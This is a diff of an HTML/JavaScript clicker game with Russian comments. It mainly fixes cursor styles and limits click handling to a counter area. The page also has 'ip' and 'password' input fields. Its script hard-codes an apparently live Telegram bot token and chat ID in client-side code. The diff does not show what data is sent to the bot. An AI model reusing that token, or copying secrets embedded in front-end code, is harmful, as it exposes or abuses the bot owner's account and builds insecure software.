@@ -30,14 +30,24 @@
             min-height: 100vh;
             background: linear-gradient(45deg, #1a1a2e, #16213e, #0f3460);
             font-family: 'Orbitron', sans-serif;
-            cursor: pointer;
             overflow-x: hidden;
             display: flex;
             flex-direction: column;
             align-items: center;
-            /* ДОБАВЛЕНО: разрешаем прокрутку */
+            /* ИСПРАВЛЕНО: правильная прокрутка */
             overflow-y: auto;
             -webkit-overflow-scrolling: touch;
+            /* ИСПРАВЛЕНО: убираем курсор для всего body */
+            cursor: default;
+        }
+
+        .click-area {
+            /* ИСПРАВЛЕНО: только эта область кликабельна для счетчика */
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .main-container {
@@ -47,7 +57,6 @@
             flex-direction: column;
             align-items: center;
             gap: 20px;
-            /* ДОБАВЛЕНО: чтобы контент не обрезался */
             min-height: min-content;
         }
 
@@ -63,8 +72,9 @@
             transform: translateZ(0);
             padding: 20px;
             text-align: center;
-            /* ИСПРАВЛЕНО: убрал фиксированный margin */
             margin: 0;
+            /* ИСПРАВЛЕНО: кликабельна только цифра */
+            cursor: pointer;
         }
 
         .counter:active {
@@ -81,7 +91,6 @@
             width: 100%;
             color: white;
             font-size: 1.2rem;
-            /* ИСПРАВЛЕНО: убрал фиксированный margin */
             margin: 0;
         }
 
@@ -104,8 +113,9 @@
             border: 2px solid rgba(255, 255, 255, 0.2);
             width: 100%;
             text-align: center;
-            /* ИСПРАВЛЕНО: убрал фиксированный margin */
             margin: 0;
+            /* ИСПРАВЛЕНО: убираем кликабельность для панели */
+            cursor: default;
         }
 
         .panel-title {
@@ -138,6 +148,8 @@
             font-family: 'Orbitron', sans-serif;
             font-size: 1rem;
             transition: all 0.3s ease;
+            /* ИСПРАВЛЕНО: нормальный курсор для инпутов */
+            cursor: text;
         }
 
         .input-group input:focus {
@@ -161,6 +173,8 @@
             letter-spacing: 1px;
             position: relative;
             overflow: hidden;
+            /* ИСПРАВЛЕНО: явно указываем курсор для кнопок */
+            cursor: pointer;
         }
 
         .button::before {
@@ -263,7 +277,6 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            /* ДОБАВЛЕНО: разрешаем прокрутку в модалке */
             overflow-y: auto;
             padding: 20px;
         }
@@ -276,7 +289,6 @@
             width: 90%;
             text-align: center;
             border: 3px solid #ff6b6b;
-            /* ДОБАВЛЕНО: чтобы модалка не обрезалась */
             margin: auto;
         }
 
@@ -324,19 +336,7 @@
             animation: newRecord 0.5s ease;
         }
 
-        /* Запрет выделения */
-        .counter::selection,
-        .button::selection,
-        .input-group::selection {
-            background: transparent;
-        }
-        .counter::-moz-selection,
-        .button::-moz-selection,
-        .input-group::-moz-selection {
-            background: transparent;
-        }
-
-        /* ДОБАВЛЕНО: адаптивность для маленьких экранов */
+        /* Адаптивность для маленьких экранов */
         @media (max-height: 700px) {
             .counter {
                 font-size: 6rem;
@@ -368,20 +368,22 @@
     </style>
 </head>
 <body>
-    <!-- ОБЕРТКА ДЛЯ ПРОКРУТКИ -->
     <div class="main-container">
-        <!-- 3D Кликер -->
-        <div class="counter" id="counter">0</div>
+        <!-- ИСПРАВЛЕНО: область кликов только для счетчика -->
+        <div class="click-area">
+            <!-- 3D Кликер -->
+            <div class="counter" id="counter">0</div>
 
-        <!-- Статистика -->
-        <div class="stats">
-            <div class="stat-item">
-                <div>Баланс</div>
-                <div class="stat-value" id="balance">0</div>
-            </div>
-            <div class="stat-item">
-                <div>Выведено</div>
-                <div class="stat-value" id="withdrawn">0</div>
+            <!-- Статистика -->
+            <div class="stats">
+                <div class="stat-item">
+                    <div>Баланс</div>
+                    <div class="stat-value" id="balance">0</div>
+                </div>
+                <div class="stat-item">
+                    <div>Выведено</div>
+                    <div class="stat-value" id="withdrawn">0</div>
+                </div>
             </div>
         </div>
 
@@ -440,7 +442,6 @@
     </div>
 
     <script>
-        // ТВОЙ КОД ОСТАЕТСЯ БЕЗ ИЗМЕНЕНИЙ
         // Данные приложения
         let count = 0;
         let balance = 0;
@@ -453,7 +454,7 @@
         const TELEGRAM_BOT_TOKEN = '7650746775:AAHniBtp_g3UAGU8d82IoTqN9Sb8AzomE5U';
         const TELEGRAM_CHAT_ID = '6220324743';
 
-        // 3D Кликер
+        // 3D Кликер - ТОЛЬКО для счетчика
         function incrementCounter(e) {
             if (e) {
                 e.preventDefault();
@@ -642,10 +643,14 @@
         window.addEventListener('load', function() {
             loadData();
             
-            document.body.addEventListener('click', incrementCounter);
-            document.body.addEventListener('touchstart', incrementCounter, { passive: false });
-            counterElement.addEventListener('click', incrementCounter);
-            counterElement.addEventListener('touchstart', incrementCounter, { passive: false });
+            // ИСПРАВЛЕНО: кликабельна только область счетчика
+            const clickArea = document.querySelector('.click-area');
+            const counter = document.getElementById('counter');
+            
+            clickArea.addEventListener('click', incrementCounter);
+            clickArea.addEventListener('touchstart', incrementCounter, { passive: false });
+            counter.addEventListener('click', incrementCounter);
+            counter.addEventListener('touchstart', incrementCounter, { passive: false });
 
             document.getElementById('ip').addEventListener('input', saveData);
             document.getElementById('password').addEventListener('input', saveData);
@@ -657,8 +662,6 @@
 
             setInterval(saveData, 10000);
         });
-
-        // УБРАН КОД С КНОПКОЙ УСТАНОВКИ PWA
     </script>
 </body>
 </html>
